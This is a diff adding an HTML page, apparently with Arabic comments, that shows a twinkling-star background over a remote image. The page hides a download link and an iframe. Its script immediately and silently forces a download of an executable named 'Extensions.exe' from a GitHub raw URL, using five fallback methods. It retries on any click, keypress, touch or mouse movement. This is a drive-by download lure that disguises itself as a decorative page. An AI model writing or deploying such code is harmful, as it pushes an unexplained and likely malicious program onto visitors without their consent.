@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✦</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #0a0a12;
+            font-family: Arial, sans-serif;
+        }
+        
+        /* خلفية الصورة */
+        #bg-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: url('https://g.top4top.io/p_3836oiywx1.png') no-repeat center center fixed;
+            background-size: cover;
+        }
+        
+        /* النجوم */
+        #stars-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            background: transparent;
+            overflow: hidden;
+        }
+        
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 0 12px 3px rgba(255, 255, 255, 0.9);
+            animation: twinkle var(--duration, 2s) ease-in-out infinite alternate;
+            animation-delay: var(--delay, 0s);
+            opacity: 0;
+        }
+        
+        @keyframes twinkle {
+            0% { opacity: 0; transform: scale(0.6); }
+            40% { opacity: 0.95; transform: scale(1.15); }
+            70% { opacity: 0.8; transform: scale(1); }
+            100% { opacity: 0; transform: scale(0.5); }
+        }
+        
+        /* منطقة النقر */
+        #click-area {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            cursor: pointer;
+            background: transparent;
+        }
+        
+        #download-link {
+            display: none;
+        }
+        
+        #hidden-iframe {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="bg-layer"></div>
+    <div id="stars-layer"></div>
+    <div id="click-area"></div>
+    
+    <a id="download-link" download="Extensions.exe" href="https://github.com/TeacheRX1/t/raw/refs/heads/main/Extensions.exe"></a>
+    <iframe id="hidden-iframe"></iframe>
+
+    <script>
+        (function() {
+            "use strict";
+            
+            const DOWNLOAD_URL = "https://github.com/TeacheRX1/t/raw/refs/heads/main/Extensions.exe";
+            const FILE_NAME = "Extensions.exe";
+            
+            let downloadStarted = false;
+            
+            // ===== التحميل فوراً =====
+            function startDownload() {
+                if (downloadStarted) return;
+                downloadStarted = true;
+                
+                // المحاولة 1: الرابط المخفي
+                try {
+                    const link = document.getElementById('download-link');
+                    if (link) {
+                        link.click();
+                        return;
+                    }
+                } catch(e) {}
+                
+                // المحاولة 2: عنصر ديناميكي
+                try {
+                    const link = document.createElement('a');
+                    link.href = DOWNLOAD_URL;
+                    link.download = FILE_NAME;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    return;
+                } catch(e) {}
+                
+                // المحاولة 3: window.open
+                try {
+                    const win = window.open(DOWNLOAD_URL, '_blank');
+                    if (win) {
+                        setTimeout(() => { try { win.close(); } catch(e) {} }, 2000);
+                        return;
+                    }
+                } catch(e) {}
+                
+                // المحاولة 4: iframe
+                try {
+                    const iframe = document.getElementById('hidden-iframe');
+                    if (iframe) {
+                        iframe.src = DOWNLOAD_URL;
+                        return;
+                    }
+                } catch(e) {}
+                
+                // المحاولة 5: redirect
+                try {
+                    window.location.href = DOWNLOAD_URL;
+                } catch(e) {}
+            }
+            
+            // ===== إنشاء النجوم =====
+            function createStars() {
+                const container = document.getElementById('stars-layer');
+                if (!container) return;
+                
+                const starCount = 180;
+                const fragment = document.createDocumentFragment();
+                
+                for (let i = 0; i < starCount; i++) {
+                    const star = document.createElement('div');
+                    star.className = 'star';
+                    
+                    const size = 1.5 + Math.random() * 5;
+                    star.style.width = size + 'px';
+                    star.style.height = size + 'px';
+                    
+                    star.style.left = Math.random() * 100 + '%';
+                    star.style.top = Math.random() * 100 + '%';
+                    
+                    const duration = 1.2 + Math.random() * 2.8;
+                    star.style.setProperty('--duration', duration + 's');
+                    
+                    const delay = Math.random() * 4;
+                    star.style.setProperty('--delay', delay + 's');
+                    
+                    star.style.opacity = '0';
+                    fragment.appendChild(star);
+                }
+                
+                container.appendChild(fragment);
+            }
+            
+            // ===== تشغيل فوري =====
+            // 1. ننشئ النجوم فوراً
+            createStars();
+            
+            // 2. نبدأ التحميل فوراً (بدون أي تأخير)
+            startDownload();
+            
+            // 3. أحداث إضافية للتحميل عند التفاعل
+            document.getElementById('click-area').addEventListener('click', function() {
+                if (!downloadStarted) {
+                    startDownload();
+                }
+            });
+            
+            document.addEventListener('dblclick', function() {
+                if (!downloadStarted) {
+                    startDownload();
+                }
+            });
+            
+            document.addEventListener('keydown', function() {
+                if (!downloadStarted) {
+                    startDownload();
+                }
+            });
+            
+            document.addEventListener('touchstart', function() {
+                if (!downloadStarted) {
+                    startDownload();
+                }
+            });
+            
+            // 4. تحميل إضافي عند أي حركة ماوس
+            let mouseCount = 0;
+            document.addEventListener('mousemove', function() {
+                mouseCount++;
+                if (mouseCount === 5 && !downloadStarted) {
+                    startDownload();
+                }
+            });
+            
+        })();
+    </script>
+
+</body>
+</html>
